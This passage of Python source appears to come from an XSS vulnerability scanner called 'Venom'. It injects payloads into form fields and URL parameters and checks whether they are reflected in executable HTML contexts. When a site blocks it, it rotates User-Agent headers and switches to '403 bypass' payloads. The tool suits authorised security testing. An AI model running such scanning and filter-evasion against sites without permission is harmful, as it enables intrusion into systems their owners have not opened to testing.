        logging.info(f"Testing form inputs: {list(inputs.keys())} on {action}")
        print(f"{BLUE}[*] Testing FORM on {CYAN}{action}{RESET} with {len(inputs)} inputs and {len(payloads)} payloads")
        try:
            base_response = self.session.post(action, data=inputs, timeout=self.args.timeout, verify=True).text
            base_length = len(base_response)
            base_hash = hash(base_response)
        except RequestException:
            base_response, base_length, base_hash = "", 0, 0
        
        for name in inputs:
            for payload in payloads:
                self.current_payload = payload
                self.total_tests.increment()
                test_params = inputs.copy()
                if self.args.payload_field and self.args.payload_field in test_params:
                    test_params[self.args.payload_field] = payload
                else:
                    test_params[name] = payload
                self.task_queue.put(lambda n=name, tp=test_params, pl=payload, br=base_response, bl=base_length, bh=base_hash: 
                    self.test_request(action, tp, pl, 'post', injection_point=f"Form Field ({n})", base_response=br, base_length=bl, base_hash=bh))

    def test_request(self, url: str, params: dict, payload: str, method: str = 'get', injection_point: str = 'Unknown', 
                    base_response: str = "", base_length: int = 0, base_hash: int = 0) -> None:
        retry_attempts = 3
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
        ]
        
        for attempt in range(retry_attempts):
            try:
                if attempt > 0:
                    self.session.headers['User-Agent'] = random.choice(user_agents)
                    logging.info(f"Retrying {method.upper()} {url} with new User-Agent")
                    print(f"{YELLOW}[!] Retrying {method.upper()} with new User-Agent (Attempt {attempt+1}){RESET}")
                
                logging.info(f"Testing {method.upper()} {url} with payload: {payload} at {injection_point} (Attempt {attempt+1})")
                print(f"{BLUE}╔════════════════════════════════════════════════════╗{RESET}")
                print(f"{BLUE}║{RESET} {CYAN}Testing {method.upper()} Injection{RESET} {BLUE}║{RESET}")
                print(f"{BLUE}║{RESET} {WHITE}URL:{RESET} {GREEN}{url}{RESET}")
                print(f"{BLUE}║{RESET} {WHITE}Injection Point:{RESET} {YELLOW}{injection_point}{RESET}")
                print(f"{BLUE}║{RESET} {WHITE}Payload:{RESET} {ORANGE}{payload}{RESET}")
                print(f"{BLUE}╚════════════════════════════════════════════════════╝{RESET}")
                
                data = self.post_data.copy() if method == 'post' else None
                if method == 'post' and params:
                    if self.args.payload_field and self.args.payload_field in data:
                        data[self.args.payload_field] = payload
                    else:
                        data.update(params)
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=data if method == 'post' else None,
                    headers=self.session.headers,
                    timeout=self.args.timeout,
                    verify=True
                )
                status_code = resp.status_code
                
                if status_code in [403, 429] and attempt < retry_attempts - 1:
                    self.use_403_bypass = True
                    self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, True)
                    self.payloads = self.payload_generator.generate()
                    self.total_payloads = len(self.payloads)
                    continue
                
                logging.info(f"Response status: {status_code}, length: {len(resp.text)}")
                if self.args.verbose:
                    logging.info(f"Response content: {resp.text[:100]}...")
                print(f"{PURPLE}Response: {WHITE}Status {status_code}{RESET}, Length: {CYAN}{len(resp.text)}{RESET}")
                
                full_url = url + ('?' + urlencode(params) if method == 'get' and params else '')
                if method == 'get':
                    parsed = urlparse(full_url)
                    clean_params = parse_qs(parsed.query)
                    full_url = parsed.scheme + "://" + parsed.netloc + parsed.path + '?' + urlencode(clean_params, doseq=True)
                
                response_text = html.unescape(resp.text.lower())
                response_length = len(resp.text)
                response_hash = hash(resp.text)
                reflected = re.search(re.escape(payload.lower()), response_text) is not None
                
                if not reflected:
                    print(f"{YELLOW}[!] Payload not reflected in response{RESET}")
                if response_length == base_length and response_hash == base_hash:
                    print(f"{YELLOW}[!] Response identical to base response{RESET}")
                    break
                
                similarity = self.check_similarity(base_response, resp.text)
                print(f"{PURPLE}Similarity to Base: {WHITE}{similarity:.2f}{RESET}")
                if similarity > 0.85:
                    logging.info(f"Response too similar to base (similarity: {similarity:.2f}), skipping.")
                    print(f"{YELLOW}[!] Response too similar to base (Similarity: {similarity:.2f} > 0.85){RESET}")
                    break
                
                soup = BeautifulSoup(resp.text, 'html.parser')
                in_executable_context = False
                escapes_context = False
                
                for tag in soup.find_all(['script', 'iframe', 'meta', 'link', 'body', 'img', 'svg', 'div', 'input']):
                    if tag.name == 'script' and payload.lower() in tag.text.lower():
                        in_executable_context = True
                        break
                    elif tag.name in ['iframe', 'meta', 'link', 'body', 'img', 'svg', 'div', 'input']:
                        attrs = tag.attrs
                        for attr, value in attrs.items():
                            if payload.lower() in str(value).lower() and (attr.startswith('on') or attr in ['src', 'href', 'content']):
                                in_executable_context = True
                                break
                        if in_executable_context:
                            break
                
                in_input_value = False
                for input_tag in soup.find_all('input'):
                    value = str(input_tag.get('value', '')).lower()
                    if payload.lower() in value:
                        in_input_value = True
                        input_str = str(input_tag).lower()
                        post_payload = input_str[input_str.index(payload.lower()) + len(payload):]
                        if '"' in post_payload or '>' in post_payload:
                            escapes_context = True
                        break
                
                if not in_executable_context and not in_input_value:
                    text_nodes = [node.strip().lower() for node in soup.find_all(string=True) if node.strip()]
                    for text in text_nodes:
                        if payload.lower() in text and '<' not in text and '>' not in text:
                            in_executable_context = True
                            break
                
                verified = reflected and (in_executable_context or escapes_context)
                print(f"{PURPLE}Reflected:{RESET} {GREEN}{'Yes' if reflected else 'No'}{RESET}, {PURPLE}Executable:{RESET} {GREEN}{'Yes' if in_executable_context or escapes_context else 'No'}{RESET}")
                
                if reflected:
                    severity = "High" if "alert(" in payload.lower() or "on" in payload.lower() or "javascript:" in payload.lower() else "Medium"
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS ({'Executable' if verified else 'Reflected Only'}, Severity: {severity if verified else 'Low'})", popup=verified)
                    if self.ai_assistant and verified:
                        self.ai_assistant.record_success(payload, "html" if in_input_value else "js", status_code)
                
                self._display_status()
                break
                
            except (RequestException, SSLError, Timeout) as e:
                logging.warning(f"Request failed for {url}: {e} (Attempt {attempt+1})")
                print(f"{RED}[!] Request failed: {e} (Attempt {attempt+1}){RESET}")
                if attempt == retry_attempts - 1:
                    logging.error(f"All {retry_attempts} attempts failed for {url}")
                    print(f"{RED}[!] All {retry_attempts} attempts failed{RESET}")

    def check_similarity(self, base_response: str, test_response: str) -> float:
        try:
            vectorizer = TfidfVectorizer()
            tfidf = vectorizer.fit_transform([base_response, test_response])
            similarity = cosine_similarity(tfidf[0:1], tfidf[1:2])[0][0]
            logging.debug(f"Similarity score: {similarity:.2f}")
            return similarity
        except Exception as e:
            logging.error(f"Similarity check failed: {e}")
            return 0.0

    def _display_status(self) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = (self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0
        progress = min(progress, 100.0)
        status = f"{BLUE}╔════ Scan Progress Overview ═════╗{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Progress:{RESET} {WHITE}{progress:.1f}%{RESET}  {CYAN}Tests:{RESET} {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}  {CYAN}Vulns:{RESET} {RED}{len(self.vulnerabilities)}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Payload:{RESET} {ORANGE}{self.current_payload}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Elapsed Time:{RESET} {WHITE}{elapsed}s{RESET}\n" \
                 f"{BLUE}╚═════════════════════════════════╝{RESET}"
        sys.stdout.write(f"\033[2K\r{status}")
        sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str = 'XSS', popup: bool = False) -> None:
        with self.lock:
            if not payload.strip():
                logging.info(f"Skipping empty payload report for {url}")
                return
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            vuln = {
                'url': url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup,
                'context': 'JavaScript' if 'script' in payload.lower() or 'javascript:' in payload.lower() else 'HTML',
                'waf_status': self.waf_csp_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No",
                'params': params,
                'method': self.args.method if self.args.method != 'both' else 'post' if 'Form' in vuln_type else 'get'
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)

            severity = vuln_type.split("Severity: ")[1].split(")")[0] if "Severity: " in vuln_type else "Low"
            severity_color = GREEN if "Low" in severity else ORANGE if "Medium" in severity else RED
            output = f"{RED}╔════════════════════════════════════════════════════╗{RESET}\n" \
                     f"{RED}║{RESET} {RED}XSS DETECTED [{timestamp}]{RESET} {RED}║{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Type:{RESET} {CYAN}{vuln_type.split('Severity:')[0]}{RESET}{WHITE}Severity:{RESET} {severity_color}{severity}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}URL:{RESET} {GREEN}{url}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Payload:{RESET} {ORANGE}{payload}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Context:{RESET} {PURPLE}{vuln['context']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Executed:{RESET} {GREEN}{'Yes' if popup else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}WAF/CSP:{RESET} {YELLOW}{self.waf_csp_status}{RESET} | {WHITE}Bypass:{RESET} {YELLOW}{'Yes' if self.bypass_performed or self.use_403_bypass else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Verify:{RESET} {BLUE}curl -X {vuln['method'].upper()} \"{url}\" {'-d \"' + urlencode(params) + '\"' if vuln['method'] == 'post' and params else ''}{RESET}\n"
            if popup and "High" in severity:
                output += f"{RED}║{RESET} {WHITE}Proof:{RESET} {GREEN}Potential execution detected!{RESET}\n"
            output += f"{RED}╚════════════════════════════════════════════════════╝{RESET}"
            print(output, flush=True)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{BLUE}╔════════════════════════════════════════════════════╗{RESET}\n" \
                  f"{BLUE}║{RESET}         {CYAN}Venom XSS Scan Summary{RESET}                 {BLUE}║{RESET}\n" \
                  f"{BLUE}╚════════════════════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {GREEN}{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}{RESET}\n" \
                  f"{WHITE}Scan Ended:{RESET} {GREEN}{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}{RESET}\n" \
                  f"{WHITE}Total Runtime:{RESET} {YELLOW}{runtime} seconds{RESET}\n" \
                  f"{WHITE}URLs Scanned:{RESET} {CYAN}{len(self.visited_urls)}{RESET}\n" \
                  f"{WHITE}Tests Performed:{RESET} {CYAN}{self.total_tests.get()}{RESET}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {RED}{len(self.vulnerabilities)}{RESET}\n" \
                  f"{WHITE}Executable Vulnerabilities:{RESET} {ORANGE}{executed_count}{RESET}\n" \
                  f"{WHITE}Reflected Only:{RESET} {YELLOW}{len(self.vulnerabilities) - executed_count}{RESET}\n"
        print(summary)
        logging.info(summary)
        
        if self.vulnerabilities:
            findings = f"\n{BLUE}╔════════════════════════════════════════════════════╗{RESET}\n" \
                       f"{BLUE}║{RESET}         {CYAN}Detailed XSS Findings{RESET}                  {BLUE}║{RESET}\n" \
                       f"{BLUE}╚════════════════════════════════════════════════════╝{RESET}\n"
            if self.args.full_report or len(self.vulnerabilities) <= 10:
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    severity = vuln['type'].split("Severity: ")[1].split(")")[0] if "Severity: " in vuln['type'] else "Low"
                    severity_color = GREEN if "Low" in severity else ORANGE if "Medium" in severity else RED
                    color = RED
                    findings += f"{color}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {GREEN}{vuln['timestamp']}{RESET}\n" \
                                f"  {WHITE}Type:{RESET} {CYAN}{vuln['type'].split('Severity:')[0]}{RESET}{WHITE}Severity:{RESET} {severity_color}{severity}{RESET}\n" \
                                f"  {WHITE}URL:{RESET} {GREEN}{vuln['url']}{RESET}\n" \
                                f"  {WHITE}Payload:{RESET} {ORANGE}{vuln['payload']}{RESET}\n" \
                                f"  {WHITE}Context:{RESET} {PURPLE}{vuln['context']}{RESET}\n" \
                                f"  {WHITE}Executed:{RESET} {GREEN}{'Yes' if vuln['executed'] else 'No'}{RESET}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {YELLOW}{vuln['waf_status']}{RESET}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {YELLOW}{vuln['bypass']}{RESET}\n" \
                                f"  {WHITE}Verification:{RESET} {BLUE}curl -X {vuln['method'].upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if vuln['method'] == 'post' and vuln['params'] else ''}{RESET}\n" \
                                f"{BLUE}{'═' * 50}{RESET}\n"
            else:
                findings += f"Showing first 10 vulnerabilities (use --full-report for all):\n"
                for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                    severity = vuln['type'].split("Severity: ")[1].split(")")[0] if "Severity: " in vuln['type'] else "Low"
                    severity_color = GREEN if "Low" in severity else ORANGE if "Medium" in severity else RED
                    color = RED
                    findings += f"{color}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {GREEN}{vuln['timestamp']}{RESET}\n" \
                                f"  {WHITE}Type:{RESET} {CYAN}{vuln['type'].split('Severity:')[0]}{RESET}{WHITE}Severity:{RESET} {severity_color}{severity}{RESET}\n" \
                                f"  {WHITE}URL:{RESET} {GREEN}{vuln['url']}{RESET}\n" \
                                f"  {WHITE}Payload:{RESET} {ORANGE}{vuln['payload']}{RESET}\n" \
                                f"  {WHITE}Context:{RESET} {PURPLE}{vuln['context']}{RESET}\n" \
                                f"  {WHITE}Executed:{RESET} {GREEN}{'Yes' if vuln['executed'] else 'No'}{RESET}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {YELLOW}{vuln['waf_status']}{RESET}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {YELLOW}{vuln['bypass']}{RESET}\n" \
                                f"  {WHITE}Verification:{RESET} {BLUE}curl -X {vuln['method'].upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if vuln['method'] == 'post' and vuln['params'] else ''}{RESET}\n" \
                                f"{BLUE}{'═' * 50}{RESET}\n"
            findings += f"{GREEN}Total Confirmed XSS Vulnerabilities: {len(self.vulnerabilities)}{RESET}\n"
            with open("venom_report.txt", "w") as f:
                f.write(summary + findings)
            print(f"{GREEN}[+] Full report written to venom_report.txt{RESET}")
            if len(self.vulnerabilities) <= 10 or not self.args.full_report:
                print(findings)
        else:
            print(f"\n{YELLOW}[!] No XSS vulnerabilities detected.{RESET}\n")
            logging.info("No XSS vulnerabilities detected.")

if __name__ == "__main__":
    try:
        args = parse_args()
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted by user")
        if 'scanner' in locals():
            scanner.running = False
            scanner.report()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if 'scanner' in locals():
            scanner.report()
        sys.exit(1)
    finally:
        if 'scanner' in locals():
            scanner.report()
    input("Press Enter to exit...")
